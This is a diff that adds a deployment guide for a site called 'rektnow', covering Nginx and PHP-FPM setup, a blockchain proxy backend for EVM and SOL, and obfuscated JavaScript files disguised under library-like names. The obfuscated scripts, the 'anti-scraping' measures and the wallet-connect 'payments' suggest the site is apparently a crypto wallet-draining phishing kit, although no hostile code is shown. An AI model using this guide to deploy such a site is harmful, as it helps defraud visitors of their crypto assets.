@@ -1,0 +1,196 @@
+🚀 VITE + REACT + TYPESCRIPT MIGRATION - DEPLOYMENT GUIDE
+=========================================================
+
+📁 PROJECT STRUCTURE:
+--------------------
+mysites/
+├── backend/              # PHP backend files
+│   ├── config.php       # Main proxy (EVM & SOL)
+│   ├── secureproxy.php  # Simple proxy (EVM only)
+│   └── robots.txt
+├── public/              # Static assets
+│   ├── *.js             # Obfuscated JS files
+│   └── *.png            # Icons
+├── src/                 # React source code
+│   ├── components/      # React components
+│   ├── context/         # React context
+│   ├── types/           # TypeScript types
+│   ├── App.tsx          # Main app
+│   ├── main.tsx         # Entry point
+│   └── style.css        # Styles
+├── index.html           # HTML template
+├── vite.config.ts       # Vite configuration
+├── tsconfig.json        # TypeScript config
+└── package.json         # Dependencies
+
+
+🔧 LOCAL DEVELOPMENT (Windows):
+-------------------------------
+1. Install dependencies:
+   npm install
+
+2. Run development server:
+   npm run dev
+
+3. Open browser:
+   http://localhost:3000
+
+
+📦 BUILD FOR PRODUCTION:
+------------------------
+npm run build
+
+This creates a 'dist' folder with optimized files.
+
+
+🌐 UBUNTU VPS DEPLOYMENT:
+-------------------------
+
+STEP 1: Transfer files to server
+---------------------------------
+# Using SCP or SFTP, upload these folders:
+- dist/ (built React app)
+- backend/ (PHP files)
+
+Example SCP command:
+scp -r dist/ user@your-server:/var/www/rektnow/
+scp -r backend/ user@your-server:/var/www/rektnow/
+
+
+STEP 2: Nginx Configuration
+----------------------------
+Create: /etc/nginx/sites-available/rektnow
+
+server {
+    listen 80;
+    server_name your-domain.com;
+
+    # React app (static files)
+    root /var/www/rektnow/dist;
+    index index.html;
+
+    # Serve React app
+    location / {
+        try_files $uri $uri/ /index.html;
+    }
+
+    # Proxy PHP backend requests
+    location /api/ {
+        alias /var/www/rektnow/backend/;
+        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
+        fastcgi_index config.php;
+        include fastcgi_params;
+        fastcgi_param SCRIPT_FILENAME $request_filename;
+    }
+
+    # Static assets
+    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
+        expires max;
+        add_header Cache-Control "public, immutable";
+    }
+}
+
+Enable site:
+sudo ln -s /etc/nginx/sites-available/rektnow /etc/nginx/sites-enabled/
+sudo nginx -t
+sudo systemctl reload nginx
+
+
+STEP 3: PHP Setup
+-----------------
+# Install PHP-FPM
+sudo apt update
+sudo apt install php8.1-fpm php8.1-curl php8.1-mbstring
+
+# Ensure PHP-FPM is running
+sudo systemctl start php8.1-fpm
+sudo systemctl enable php8.1-fpm
+
+# Set permissions
+sudo chown -R www-data:www-data /var/www/rektnow
+sudo chmod -R 755 /var/www/rektnow
+
+
+STEP 4: SSL (Optional but recommended)
+---------------------------------------
+sudo apt install certbot python3-certbot-nginx
+sudo certbot --nginx -d your-domain.com
+
+
+⚙️ ENVIRONMENT NOTES:
+---------------------
+1. The obfuscated JS files (utilmodule-3.4.4.js, office-ui-fabric.min.js, 
+   main-ey63jdvr1g5.min.js) are loaded in index.html and should work 
+   without modification.
+
+2. Backend PHP files remain unchanged - they handle blockchain proxy.
+
+3. Anti-scraping protection is built into the HTML.
+
+4. The app uses ConnectWallet for payments (window.startConnect).
+
+
+🔌 API PROXY ENDPOINTS:
+-----------------------
+Frontend makes requests to:
+- /api/?e=endpoint → EVM proxy (config.php)
+- /api/?s=endpoint → SOL proxy (config.php)
+
+Vite dev server proxies these to: http://localhost:8000
+In production, Nginx handles the proxy.
+
+
+🐛 TROUBLESHOOTING:
+------------------
+1. If React doesn't load:
+   - Check browser console
+   - Verify index.html is being served
+
+2. If PHP backend doesn't work:
+   - Check PHP-FPM: sudo systemctl status php8.1-fpm
+   - Check Nginx error log: sudo tail -f /var/log/nginx/error.log
+
+3. If payments don't work:
+   - Ensure main-ey63jdvr1g5.min.js is loaded
+   - Check window.startConnect is defined
+
+4. Build errors:
+   - Run: npm install
+   - Check Node version: node -v (should be 18+)
+
+
+✅ VERIFICATION CHECKLIST:
+-------------------------
+[ ] npm run build succeeds
+[ ] dist/ folder created
+[ ] All .js files in public/
+[ ] Backend files in backend/
+[ ] Nginx config updated
+[ ] PHP-FPM running
+[ ] Domain DNS configured
+[ ] SSL certificate installed (if using HTTPS)
+
+
+📞 POST-DEPLOYMENT TESTING:
+--------------------------
+1. Open site in browser
+2. Test language switcher
+3. Test login modal
+4. Check payment buttons
+5. Verify canvas animation works
+6. Test on mobile
+
+
+🎯 QUICK DEPLOY COMMANDS:
+-------------------------
+# On local machine (Windows):
+npm run build
+
+# On Ubuntu VPS:
+cd /var/www/rektnow
+sudo systemctl reload nginx
+sudo systemctl restart php8.1-fpm
+
+# Check logs:
+sudo tail -f /var/log/nginx/access.log
+sudo tail -f /var/log/nginx/error.log
